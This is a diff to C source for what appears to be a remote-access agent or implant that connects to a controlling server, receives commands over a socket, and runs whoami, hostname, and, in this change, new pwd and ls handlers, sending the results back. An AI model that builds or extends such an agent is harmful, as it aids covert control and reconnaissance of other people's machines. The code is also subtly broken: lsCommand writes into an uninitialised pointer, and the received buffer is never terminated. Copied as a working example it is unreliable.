@@ -2,6 +2,7 @@
 #include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <dirent.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
@@ -19,6 +20,12 @@ char *whoamiCommand();
 
 //hostname command
 char *hostnameCommand();
+
+//pwd command
+char *pwdCommand();
+
+//ls command
+char *lsCommand();
 
 int main() {
     networking();
@@ -45,7 +52,7 @@ void networking() {
     
     while (1) {
     	//receiving http payload
-    	char receive[2048];
+    	char receive[1024];
     	int inferno_receive = recv(inferno_socket, receive, 1024, 0);
     	printf("Receiving:\n\n%s\n\n", receive);
         
@@ -54,13 +61,17 @@ void networking() {
         content_length += strlen("{'payload':");
         char *command_start = strtok(content_length, "'");
         char *command = strtok(command_start, "'");
+
+        //executing payload
+        char response[1024];
         char *task = executing(command);
+        sprintf(response, "%s\r\n", task);
         printf("Executing: '%s'\n", command);
 
     	//sending payload result
-    	printf("Sending: '%s' from agent...\n", task);
-    	ssize_t inferno_send = send(inferno_socket, task, sizeof(task), 0);
-    	printf("Sent\n\n");
+    	printf("Sending: '%s' from agent...\n", response);
+    	ssize_t inferno_send = send(inferno_socket, response, sizeof(response), 0);
+    	printf("Sent:\n\n'%s' from agent...\n", response);
     }
 }
 
@@ -74,6 +85,14 @@ char *executing(char *receive) {
     //execute hostname
     } else if (strcmp(receive, "hostname") == 0) {
         task = hostnameCommand();
+
+    //execute pwd
+    } else if (strcmp(receive, "pwd") == 0) {
+        task = pwdCommand();
+    
+    // execute ls
+    } else if (strcmp(receive, "ls") == 0) {
+        task = lsCommand();
 
     //payload not yet build
     }else {
@@ -90,6 +109,27 @@ char *whoamiCommand() {
 //hostname syscall
 char *hostnameCommand() {
     static char hostname[1024];
-    gethostname(hostname, 1024);
+    gethostname(hostname, sizeof(hostname));
     return hostname;
+}
+
+//pwd syscall
+char *pwdCommand() {
+    static char directory[1024];
+    getcwd(directory, 1024);
+    return directory;
+}
+
+//ls syscall
+char *lsCommand() {
+    char *buf;
+    DIR *dirp;
+    struct dirent *list;
+    dirp = opendir(".");
+    sprintf(buf, "Size\tName\n");
+    sprintf(buf + strlen(buf), "====\t====\n");
+    while ((list = readdir(dirp)) != NULL) {
+        sprintf(buf + strlen(buf), "%d\t%s\t\n", list->d_reclen, list->d_name);
+    }
+    return buf;
 }
